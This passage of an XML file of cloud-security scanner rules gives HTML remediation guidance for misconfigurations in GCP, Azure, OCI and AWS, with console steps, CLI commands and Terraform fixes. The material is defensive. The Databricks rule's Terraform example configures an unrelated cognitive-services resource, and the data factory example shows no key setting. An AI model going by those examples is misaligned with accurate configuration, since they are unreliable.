<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Cloud SQL is a fully managed relational database service for MySQL, PostgreSQL and SQL Server. It offers data encryption at rest and in transit, Private connectivity with VPC and user-controlled network access with firewall protection. Backups provide a way to restore a Cloud SQL instance to recover lost data or recover from a problem with your instance. </p>
<p>We recommend you enable automated backups for instances that contain data of high importance.</p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_general_2' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_general_2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_general_2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_158</key>
    <name>Ensure Azure Databricks workspace is not public</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-databricks-workspace-is-public"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-databricks-workspace-is-public"></div>Azure Databricks workspace is public</div><a aria-label="Skip link to Azure Databricks workspace is public" class="heading-anchor-icon fa fa-anchor" href="#azure-databricks-workspace-is-public"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_cognitive_account</li>
<li><strong>Argument:</strong> public_network_access_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {
              ...
+             public_network_access_enabled    = false
              ...
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-databricks-workspace-is-not-public' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-databricks-workspace-is-not-public</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-databricks-workspace-is-not-public' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_15</key>
    <name>Ensure GCP BigQuery dataset is not publicly accessible</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-bigquery-dataset-is-publicly-accessible"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-big-query-dataset-is-publicly-accessible"></div>GCP BigQuery dataset is publicly accessible</div><a aria-label="Skip link to GCP BigQuery dataset is publicly accessible" class="heading-anchor-icon fa fa-anchor" href="#gcp-bigquery-dataset-is-publicly-accessible"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Dataset-level permissions help determine which users, groups, and service accounts are allowed to access tables, views, and table data in a specific BigQuery dataset. You can configure BigQuery permissions at a higher level in the Cloud IAM resource hierarchy. Your configurations are inherited and based on the IAM structure you select to apply.</p>
<p>We recommend you ensure private datasets remain private by avoiding the <strong>All Authenticated Users</strong> option which  gives all Google account holders access to the dataset, and makes the dataset public.</p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_general_3' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_general_3</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_general_3' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_15</key>
    <name>Ensure Azure data factories are encrypted with a customer-managed key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-data-factories-are-not-encrypted-with-a-customer-managed-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-data-factories-are-not-encrypted-with-a-customer-managed-key"></div>Azure data factories are not encrypted with a customer-managed key</div><a aria-label="Skip link to Azure data factories are not encrypted with a customer-managed key" class="heading-anchor-icon fa fa-anchor" href="#azure-data-factories-are-not-encrypted-with-a-customer-managed-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Use customer-managed keys to manage the encryption at rest of your Azure Data Factory. By default, customer data is encrypted with service-managed keys, but customer-managed keys are commonly required to meet regulatory compliance standards. Customer-managed keys enable the data to be encrypted with an Azure Key Vault key created and owned by you. You have full control and responsibility for the key lifecycle, including rotation and management.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_data_factory, azurerm_data_factory_linked_service_key_vault</li>
<li><strong>Argument:</strong> data_factory_name (of <em>azurerm_data_factory_linked_service_key_vault</em> )</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_data_factory" "data_factory_good" {
  name                = "example"
  location            = "location"
  resource_group_name = "group"
}

resource "azurerm_data_factory_linked_service_key_vault" "factory_good" {
  name                = "example"
  resource_group_name = "example"
  data_factory_name   = azurerm_data_factory.data_factory_good.name
  key_vault_id        = "123456"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-data-factories-are-encrypted-with-a-customer-managed-key' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-data-factories-are-encrypted-with-a-customer-managed-key</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-data-factories-are-encrypted-with-a-customer-managed-key' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_28</key>
    <name>Ensure GCP storage buckets are not publicly accessible to all authenticated users</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-storage-buckets-are-publicly-accessible-to-all-authenticated-users"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-storage-buckets-are-publicly-accessible-to-all-authenticated-users"></div>GCP storage buckets are publicly accessible to all authenticated users</div><a aria-label="Skip link to GCP storage buckets are publicly accessible to all authenticated users" class="heading-anchor-icon fa fa-anchor" href="#gcp-storage-buckets-are-publicly-accessible-to-all-authenticated-users"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Allowing anonymous or public access to a Cloud Storage bucket grants permissions to anyone to access the bucket's content. If you are storing sensitive data in the bucket anonymous and public access may not be desired. </p>
<p>We recommend you ensure anonymous and public access to a bucket is not allowed.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/storage/browser" target="_self">Storage</a>.</li>
<li>Navigate to <strong>Bucket</strong> details page, select <em>bucket name</em>.</li>
<li>Click <strong>Permissions</strong> tab.</li>
<li>To remove a specific role assignment, to the front of <strong>allUsers</strong> and <strong>allAuthenticatedUsers</strong>, click <strong>Delete</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To remove access to <strong>allUsers</strong> and <strong>allAuthenticatedUsers</strong>, use the following commands:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gsutil iam ch -d allUsers gs://BUCKET_NAME</code><br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gsutil iam ch -d allAuthenticatedUsers gs://BUCKET_NAME</code></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>
<p><strong>Resource</strong>: google_storage_bucket_iam_member</p>
</li>
<li>
<p><strong>Argument</strong>: member</p>
</li>
<li>
<p><strong>Resource</strong>: google_storage_bucket_iam_binding</p>
</li>
<li>
<p><strong>Field</strong>: members</p>
</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">//Option 1
resource "google_storage_bucket_iam_member" "member" {
  bucket = google_storage_bucket.default.name
  role = "roles/storage.admin"
-  member = "allUsers"
-  member = "allAuthenticatedUsers"
}

//Option 2
resource "google_storage_bucket_iam_binding" "binding" {
  bucket = google_storage_bucket.default.name
  role = "roles/storage.admin"
  members = [
-    "allAuthenticatedUsers",
-    "allUsers"
  ]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_public_1' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_public_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_public_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_8</key>
    <name>Ensure the storage container storing activity logs is not publicly accessible</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the-storage-container-storing-activity-logs-is-publicly-accessible"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-storage-container-storing-activity-logs-is-publicly-accessible"></div>The storage container storing activity logs is publicly accessible</div><a aria-label="Skip link to The storage container storing activity logs is publicly accessible" class="heading-anchor-icon fa fa-anchor" href="#the-storage-container-storing-activity-logs-is-publicly-accessible"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The storage account container containing the activity log export should not be publicly accessible.<br/>
Allowing public access to activity log content may aid an adversary in identifying weaknesses in the affected account's use or configuration.<br/>
Configuring container Access policy to<em> private</em> will remove access from the container for everyone except owners of the storage account. Access policy needs to be set explicitly in order to allow access to other desired users.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_storage_container, azurerm_storage_account, azurerm_monitor_activity_log_alert</li>
<li><strong>Argument:</strong> container_access_type (of <em>azurerm_storage_container)</em> </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_storage_container" "ok_container" {
  name                  = "vhds"
  storage_account_name  = azurerm_storage_account.ok_account.name
+ container_access_type = "private"
}

resource "azurerm_storage_account" "ok_account" {
  name                     = "examplesa"
  resource_group_name      = azurerm_resource_group.main.name
  location                 = azurerm_resource_group.main.location
  account_tier             = "Standard"
  account_replication_type = "GRS"
}

resource "azurerm_monitor_activity_log_alert" "ok_monitor_activity_log_alert" {
  name                = "example-activitylogalert"
  resource_group_name = azurerm_resource_group.main.name
  scopes              = [azurerm_resource_group.main.id]
  description         = "This alert will monitor a specific storage account updates."

  criteria {
    resource_id    = azurerm_storage_account.ok_account.id
    operation_name = "Microsoft.Storage/storageAccounts/write"
    category       = "Recommendation"
  }


  action {
    action_group_id = azurerm_monitor_action_group.main.id

    webhook_properties = {
      from = "terraform"
    }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-the-storage-container-storing-the-activity-logs-is-not-publicly-accessible' target='_blank'> https://docs.bridgecrew.io/docs/ensure-the-storage-container-storing-the-activity-logs-is-not-publicly-accessible</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-the-storage-container-storing-the-activity-logs-is-not-publicly-accessible' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_40</key>
    <name>Ensure compute instances do not have public IPs</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="compute-instances-have-public-ips"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-compute-instances-have-public-i-ps"></div>Compute instances have public IPs</div><a aria-label="Skip link to Compute instances have public IPs" class="heading-anchor-icon fa fa-anchor" href="#compute-instances-have-public-ips"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>To reduce your attack surface Compute instances should not have public IP addresses. To minimize the instance's exposure to the internet configure instances behind load balancers.</p>
<p>We recommend you ensure compute instances are not configured to have external IP addresses.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/compute/instances" target="_self">VM instances</a>.</li>
<li>For the <strong>Instance detail page</strong>, click the <strong>instance name</strong>.</li>
<li>Click <strong>Edit</strong>.</li>
<li>For each <strong>Network interface</strong>, ensure that <strong>External IP</strong> is set to <strong>None</strong>.</li>
<li>Click <strong>Done</strong>, then click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>Describe the instance properties:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute instances describe INSTANCE_NAME --zone=ZONE</code></li>
<li>Identify the access config name that contains the external IP address. This access<br/>
config appears in the following format:</li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-networkInterfaces theme-light" data-lang="networkInterfaces" name="">- accessConfigs:
- kind: compute#accessConfig
 name: External NAT
 natIP: 130.211.181.55
 type: ONE_TO_ONE_NAT
</code></pre>
<ol start="2">
<li>To delete the access config, use the following command:</li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute instances delete-access-config INSTANCE_NAME 
--zone=ZONE 
--access-config-name "ACCESS_CONFIG_NAME"
</code></pre>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>In the above example the <strong>ACCESS_CONFIG_NAME</strong> is <strong>External NAT</strong>. </p><p>The name of your access config may be different.</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_compute_instance</li>
<li><strong>Field</strong>: access_config</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_compute_instance" "example" {
  name         = "test"
  machine_type = "n1-standard-1"
  zone         = "us-central1-a"
  boot_disk {}
-  access_config {
    ...
    }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_public_2' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_public_2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_public_2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_21</key>
    <name>Ensure OCI security group has stateless ingress security rules</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-security-group-does-not-have-stateless-ingress-security-rules"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-security-group-does-not-have-stateless-ingress-security-rules"></div>OCI security group does not have stateless ingress security rules</div><a aria-label="Skip link to OCI security group does not have stateless ingress security rules" class="heading-anchor-icon fa fa-anchor" href="#oci-security-group-does-not-have-stateless-ingress-security-rules"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Stateless rules for network security groups create one way traffic rather than two. This makes it very explicit which ports are available internally and externally. This is recommended for high volume websites.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<ol>
<li>Go to Networking &gt; Virtual Cloud Networks &gt; VCN Name &gt; Resources &gt; Network Security Groups</li>
<li>Edit your Network Security Group</li>
<li>Under Security Rules, Rules, check "Stateless" for all rules</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<ul>
<li><strong>Resource:</strong> oci_core_network_security_group_security_rule</li>
<li><strong>Arguments:</strong> stateless</li>
</ul>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-Go theme-light" data-lang="Go" name="">resource "oci_core_network_security_group_security_rule" "pass" {
  network_security_group_id = oci_core_network_security_group.test_network_security_group.id
  direction                 = "INGRESS"
  protocol                  = var.network_security_group_security_rule_protocol
+  stateless                 = true
}
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-oci-security-group-has-stateless-ingress-security-rules' target='_blank'> https://docs.bridgecrew.io/docs/ensure-oci-security-group-has-stateless-ingress-security-rules</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-oci-security-group-has-stateless-ingress-security-rules' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_222</key>
    <name>Ensure AWS DMS instance receives all minor updates automatically</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-dms-instance-does-not-receive-all-minor-updates-automatically"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-dms-instance-does-not-receive-all-minor-updates-automatically"></div>AWS DMS instance does not receive all minor updates automatically</div><a aria-label="Skip link to AWS DMS instance does not receive all minor updates automatically" class="heading-anchor-icon fa fa-anchor" href="#aws-dms-instance-does-not-receive-all-minor-updates-automatically"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>When AWS Database Migration Service (AWS DMS) supports a new version, you can upgrade your replication instances to it. There are two kinds of upgrades: major version upgrades and minor version upgrades. Minor upgrades helps maintain a secure and stable DMS with minimal impact on the replication. For this reason, we recommend that your automatic minor upgrade is enabled. Minor version upgrades only occur automatically if a minor upgrade replaces an unsafe version, such as a minor upgrade that contains bug fixes for a previous version.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws dms modify-replication-instance \
    --region ${region} \
    --replication-instance-arn ${resource_arn} \
    --auto-minor-version-upgrade \
    --apply-immediately
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  Example:
    Type: 'AWS::DMS::ReplicationInstance'
    Properties:
      EngineVersion: 3.1.4
      ReplicationInstanceIdentifier: example
      ReplicationInstanceClass: dms.t2.micro
+     AutoMinorVersionUpgrade: true
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_dms_replication_instance" "example" {
  engine_version               = "3.1.4"
  replication_instance_class   = "dms.t2.micro"
  replication_instance_id      = "example"
+ auto_minor_version_upgrade   = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-dms-instance-receives-all-minor-updates-automatically' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-dms-instance-receives-all-minor-updates-automatically</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-dms-instance-receives-all-minor-updates-automatically' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_251</key>
    <name>Ensure AWS CloudTrail logging is enabled</name>
    <description>
